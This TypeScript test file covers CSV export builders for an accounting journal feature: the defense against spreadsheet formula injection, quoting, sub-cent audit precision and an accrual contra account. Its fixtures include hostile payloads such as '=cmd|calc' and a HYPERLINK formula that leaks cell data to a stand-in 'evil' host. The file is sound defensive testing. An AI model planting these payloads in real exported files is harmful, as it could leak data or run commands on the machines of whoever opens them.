/**
 * WHAT THIS FILE DOES: Tests for the journal-export CSV builders, focused on
 * the formula-injection defense (CWE-1236). Proves a malicious GL name/code
 * exports as inert text and that RFC-4180 quoting works alongside it.
 *
 * WHY IT EXISTS: without the defense, a GL account name like `=HYPERLINK(...)`
 * typed by an org user would land in the CSV verbatim and execute when the
 * accountant opened it in Excel/Sheets.
 *
 * Pure logic only: no DB, no request. Imports the ./csv module.
 */

import { csvCell, toSummaryCsv, toJournalCsv, toDetailCsv } from '../csv'
import type { JournalData } from '../csv'
import {
  buildJournalLines,
  OFFSET_ACCOUNT,
} from '@/features/cost-management/journal-utils'
import type { JournalAuditDetail } from '@/app/actions/journal-export'

describe('csvCell — formula-injection defense (CWE-1236)', () => {
  it('prefixes a single quote when the cell starts with a formula trigger', () => {
    expect(csvCell('=cmd|calc')).toBe("'=cmd|calc")
    expect(csvCell('=1+1')).toBe("'=1+1")
    expect(csvCell('+1')).toBe("'+1")
    expect(csvCell('@SUM(A1)')).toBe("'@SUM(A1)")
  })

  it('defangs a leading minus (formula / legacy DDE) trigger', () => {
    expect(csvCell('-2+3')).toBe("'-2+3")
  })

  it('defangs a leading tab trigger (tab is not a row separator, so not quoted)', () => {
    expect(csvCell('\t=1+1')).toBe("'\t=1+1")
  })

  it('defangs AND quotes leading CR / LF triggers (they are also line breaks)', () => {
    // A leading CR or LF is both a formula trigger (prefix) and a line break
    // (RFC-4180 quote), so it gets both treatments.
    expect(csvCell('\r=1+1')).toBe('"\'\r=1+1"')
    expect(csvCell('\n=1+1')).toBe('"\'\n=1+1"')
  })

  it('quotes an INTERIOR carriage return so a formula cannot reach a new row (CWE-1236 bypass guard)', () => {
    // Without quoting, a bare CR mid-cell would let Mac-dialect / Excel
    // Text-Import parsers split the field into a NEW row starting with the
    // `=1+1+cmd` formula. Wrapping the whole value keeps it one inert text cell.
    expect(csvCell('Cost\r=1+1+cmd')).toBe('"Cost\r=1+1+cmd"')
  })

  it('leaves ordinary text and numbers untouched', () => {
    expect(csvCell('AI Inference COGS')).toBe('AI Inference COGS')
    expect(csvCell('5100')).toBe('5100')
    expect(csvCell(1234)).toBe('1234')
    expect(csvCell(0)).toBe('0')
    expect(csvCell(null)).toBe('')
  })

  it('still RFC-4180 quotes commas, quotes, and newlines (no regression)', () => {
    expect(csvCell('a,b')).toBe('"a,b"')
    expect(csvCell('she said "hi"')).toBe('"she said ""hi"""')
    expect(csvCell('line1\nline2')).toBe('"line1\nline2"')
  })

  it('prefixes AND quotes when a formula payload also contains a comma/quote', () => {
    // The exfiltration scenario: a HYPERLINK exfiltration payload has commas + quotes.
    const out = csvCell('=HYPERLINK("http://evil/?x="&A1,"click")')
    // Single-quote prefix applied first, then the whole cell RFC-4180 wrapped.
    expect(out.startsWith('"\'=HYPERLINK')).toBe(true)
    expect(out).toContain("'=HYPERLINK")
  })
})

describe('CSV exports — malicious GL name/code is defanged end-to-end', () => {
  const malicious: JournalData = {
    periodStart: '2026-05-01T00:00:00.000Z',
    periodEnd: '2026-05-31T23:59:59.999Z',
    periodLabel: 'May 2026',
    rows: [
      {
        glCode: '=cmd|calc',
        glName: '=HYPERLINK("http://evil/?leak="&A1,"refund")',
        accountingType: 'COGS',
        amount: 123.45,
        eventCount: 7,
      },
    ],
    totalAmount: 123.45,
    unmappedAmount: 0,
    hasUnmapped: false,
  }

  it('summary CSV exports a `=HYPERLINK(...)` GL name as literal text', () => {
    const csv = toSummaryCsv(malicious)
    expect(csv).toContain("'=HYPERLINK")
    expect(csv).toContain("'=cmd|calc")
    // The raw formula must never sit at a cell boundary (start of line or
    // right after a comma) where a spreadsheet would execute it.
    expect(csv).not.toMatch(/(^|,)=HYPERLINK/m)
    expect(csv).not.toMatch(/(^|,)=cmd/m)
  })

  it('journal CSV defangs the same payload (both formats route through csvCell)', () => {
    const csv = toJournalCsv(malicious)
    expect(csv).toContain("'=HYPERLINK")
    expect(csv).not.toMatch(/(^|,)=HYPERLINK/m)
  })
})

describe('toDetailCsv — drillable audit trail', () => {
  // A normal, benign audit detail: one GL line, one signal (with a manual
  // override), two usage events. Proves the flattening grain + columns.
  const normal: JournalAuditDetail = {
    periodStart: '2026-05-01T00:00:00.000Z',
    periodEnd: '2026-05-31T23:59:59.999Z',
    periodLabel: 'May 2026',
    glLines: [
      {
        glCode: '5100',
        glName: 'AI Inference',
        accountingType: 'COGS',
        amount: 15,
        eventCount: 2,
        signals: [
          {
            signalId: 'sig-a',
            signalName: 'Inference call',
            agentId: 'agent-1',
            costCategory: 'PRODUCTION_COGS',
            classification: {
              source: 'inline_dropdown',
              chosenCategory: 'PRODUCTION_COGS',
              classifiedAt: '2026-05-10T12:00:00.000Z',
              via: 'inline_dropdown',
            },
            events: [
              {
                eventId: 'ev-1',
                usageDate: '2026-05-02T00:00:00.000Z',
                usageCost: 10,
                environment: 'production',
                quantity: 1,
              },
              {
                eventId: 'ev-2',
                usageDate: '2026-05-03T00:00:00.000Z',
                usageCost: 5,
                environment: 'staging',
                quantity: 2,
              },
            ],
          },
        ],
      },
    ],
    totalAmount: 15,
    sourceLabel:
      'Source: internal usage events, not linked to provider invoices',
  }

  it('flattens to one row per (GL code, signal, event) with all columns', () => {
    const csv = toDetailCsv(normal)
    const lines = csv.split('\n')

    // Header + 2 event rows.
    expect(lines).toHaveLength(3)
    expect(lines[0]).toBe(
      'GL Code,GL Name,Account Type,Signal,Agent,Cost Category,Classification Source,Event ID,Usage Date,Environment,Quantity,Amount (USD)',
    )

    // First event row: every column present, amount at schema precision (6dp).
    const row1 = lines[1].split(',')
    expect(row1[0]).toBe('5100')
    expect(row1[3]).toBe('Inference call')
    expect(row1[4]).toBe('agent-1')
    expect(row1[5]).toBe('PRODUCTION_COGS')
    expect(row1[6]).toBe('inline_dropdown @ 2026-05-10')
    expect(row1[7]).toBe('ev-1')
    expect(row1[8]).toBe('2026-05-02')
    expect(row1[9]).toBe('production')
    expect(row1[10]).toBe('1')
    expect(row1[11]).toBe('10.000000')

    // Sum of the event Amount column reconciles to the GL line total.
    const amounts = [lines[1], lines[2]].map((l) =>
      parseFloat(l.split(',').slice(-1)[0]),
    )
    expect(amounts.reduce((a, b) => a + b, 0)).toBeCloseTo(15, 6)
  })

  it('emits sub-cent per-event amounts so the rows still reconcile (canon R4)', () => {
    // Canon R4: per-token LLM events are routinely sub-cent. Rounding each
    // event with toFixed(2) would turn these three $0.004 events into "0.00",
    // so a $0.012 GL line would show three $0.00 rows that sum to nothing and
    // the audit CSV could not prove its journal line. Rounding must happen exactly ONCE at the GL
    // presentation leaf (toSummaryCsv/toJournalCsv), never per-event before summation.
    const subCent: JournalAuditDetail = {
      periodStart: '2026-05-01T00:00:00.000Z',
      periodEnd: '2026-05-31T23:59:59.999Z',
      periodLabel: 'May 2026',
      glLines: [
        {
          glCode: '5100',
          glName: 'AI Inference',
          accountingType: 'COGS',
          amount: 0.012,
          eventCount: 3,
          signals: [
            {
              signalId: 'sig-a',
              signalName: 'Inference call',
              agentId: 'agent-1',
              costCategory: 'PRODUCTION_COGS',
              classification: {
                source: 'inline_dropdown',
                chosenCategory: 'PRODUCTION_COGS',
                classifiedAt: '2026-05-10T12:00:00.000Z',
                via: 'inline_dropdown',
              },
              events: [
                {
                  eventId: 'e1',
                  usageDate: '2026-05-02T00:00:00.000Z',
                  usageCost: 0.004,
                  environment: 'production',
                  quantity: 1,
                },
                {
                  eventId: 'e2',
                  usageDate: '2026-05-02T00:00:00.000Z',
                  usageCost: 0.004,
                  environment: 'production',
                  quantity: 1,
                },
                {
                  eventId: 'e3',
                  usageDate: '2026-05-02T00:00:00.000Z',
                  usageCost: 0.004,
                  environment: 'production',
                  quantity: 1,
                },
              ],
            },
          ],
        },
      ],
      totalAmount: 0.012,
      sourceLabel:
        'Source: internal usage events, not linked to provider invoices',
    }

    const csv = toDetailCsv(subCent)
    const lines = csv.split('\n')

    // Header + 3 event rows.
    expect(lines).toHaveLength(4)

    const eventAmounts = [lines[1], lines[2], lines[3]].map(
      (l) => l.split(',').slice(-1)[0],
    )

    // Each sub-cent event is emitted at full schema precision, NOT collapsed to 0.00.
    expect(eventAmounts).toEqual(['0.004000', '0.004000', '0.004000'])
    expect(eventAmounts.every((a) => a === '0.00')).toBe(false)

    // The three rows sum back to the $0.012 GL line — the whole point of the audit CSV.
    const summed = eventAmounts.reduce((a, b) => a + parseFloat(b), 0)
    expect(summed).toBeCloseTo(0.012, 6)
  })

  it('labels a never-overridden signal honestly (no fabricated provenance)', () => {
    const noOverride: JournalAuditDetail = {
      ...normal,
      glLines: [
        {
          ...normal.glLines[0],
          signals: [
            { ...normal.glLines[0].signals[0], classification: null },
          ],
        },
      ],
    }
    const csv = toDetailCsv(noOverride)
    expect(csv).toContain('default / not manually overridden')
  })

  it('defangs a formula-injection signal name AND glName (CWE-1236, every cell)', () => {
    const malicious: JournalAuditDetail = {
      ...normal,
      glLines: [
        {
          glCode: '5100',
          // glName starts with '=' — classic formula trigger.
          glName: '=1+1',
          accountingType: 'COGS',
          amount: 10,
          eventCount: 1,
          signals: [
            {
              signalId: 'sig-x',
              // HYPERLINK exfiltration payload with commas + quotes.
              signalName: '=HYPERLINK("http://evil","x")',
              // agentId leading '@' trigger.
              agentId: '@SUM(A1)',
              costCategory: 'PRODUCTION_COGS',
              classification: null,
              events: [
                {
                  eventId: 'ev-x',
                  usageDate: '2026-05-02T00:00:00.000Z',
                  usageCost: 10,
                  environment: 'production',
                  quantity: 1,
                },
              ],
            },
          ],
        },
      ],
    }

    const csv = toDetailCsv(malicious)

    // Each org-controlled string is neutralized with a leading single quote.
    expect(csv).toContain("'=HYPERLINK")
    expect(csv).toContain("'=1+1")
    expect(csv).toContain("'@SUM(A1)")

    // The raw formulas must NEVER sit at a cell boundary (start of line or
    // right after a comma) where a spreadsheet would execute them.
    expect(csv).not.toMatch(/(^|,)=HYPERLINK/m)
    expect(csv).not.toMatch(/(^|,)=1\+1/m)
    expect(csv).not.toMatch(/(^|,)@SUM/m)

    // The HYPERLINK payload has embedded commas + quotes → RFC-4180 wrapped
    // (leading quote prefix lands INSIDE the wrapping quotes) and quotes doubled.
    expect(csv).toContain('"\'=HYPERLINK(""http://evil"",""x"")"')
  })

  it('handles an empty audit detail (header only)', () => {
    const empty: JournalAuditDetail = {
      ...normal,
      glLines: [],
      totalAmount: 0,
    }
    const csv = toDetailCsv(empty)
    expect(csv.split('\n')).toHaveLength(1) // header only
  })
})

describe('buildJournalLines — contra account is an accrual, not Accounts Payable', () => {
  // Two real GL buckets so the "entry balances" assertion is meaningful: two
  // debit lines summing against the single offset credit line.
  const data: JournalData = {
    periodStart: '2026-05-01T00:00:00.000Z',
    periodEnd: '2026-05-31T23:59:59.999Z',
    periodLabel: 'May 2026',
    rows: [
      {
        glCode: '5100',
        glName: 'AI Inference COGS',
        accountingType: 'COGS',
        amount: 80,
        eventCount: 12,
      },
      {
        glCode: '6100',
        glName: 'AI R&D OpEx',
        accountingType: 'OpEx',
        amount: 20,
        eventCount: 3,
      },
    ],
    totalAmount: 100,
    unmappedAmount: 0,
    hasUnmapped: false,
  }

  it('credits "Accrued AI Costs" (accrued-liability), never Accounts Payable', () => {
    const lines = buildJournalLines(data)
    const offset = lines[lines.length - 1]

    expect(offset.account).toBe('Accrued AI Costs')
    expect(offset.glCode).toBe('2100')
    // The whole point: AP asserts a vendor bill that doesn't
    // exist, so the contra account must NOT be Accounts Payable / 2000.
    expect(offset.account).not.toBe('Accounts Payable')
    expect(offset.glCode).not.toBe('2000')

    // The shared constant is the single source of truth the panel copy mirrors.
    expect(OFFSET_ACCOUNT).toEqual({
      glCode: '2100',
      glName: 'Accrued AI Costs',
    })
  })

  it('puts the full period total on the credit side, nothing on debit', () => {
    const lines = buildJournalLines(data)
    const offset = lines[lines.length - 1]
    expect(offset.credit).toBe(data.totalAmount)
    expect(offset.debit).toBe(0)
  })

  it('labels the offset as an accrual that reverses when the invoice posts', () => {
    const lines = buildJournalLines(data)
    const offset = lines[lines.length - 1]
    expect(offset.memo).toMatch(/accru/i)
    expect(offset.memo).toMatch(/reverses when the provider invoice posts/i)
  })

  it('balances: sum of the debit lines equals the single offset credit', () => {
    const lines = buildJournalLines(data)
    const offset = lines[lines.length - 1]
    const debitLines = lines.slice(0, -1)
    const debitTotal = debitLines.reduce((sum, l) => sum + l.debit, 0)

    // Every debit line carries 0 on the credit side (offset is the only credit).
    expect(debitLines.every((l) => l.credit === 0)).toBe(true)
    expect(debitTotal).toBeCloseTo(offset.credit, 6)
    expect(debitTotal).toBeCloseTo(100, 6)
  })

  it('exports the accrued account end-to-end in the journal CSV (not AP)', () => {
    const csv = toJournalCsv(data)
    expect(csv).toContain('Accrued AI Costs')
    expect(csv).toContain('2100')
    expect(csv).not.toContain('Accounts Payable')
  })
})
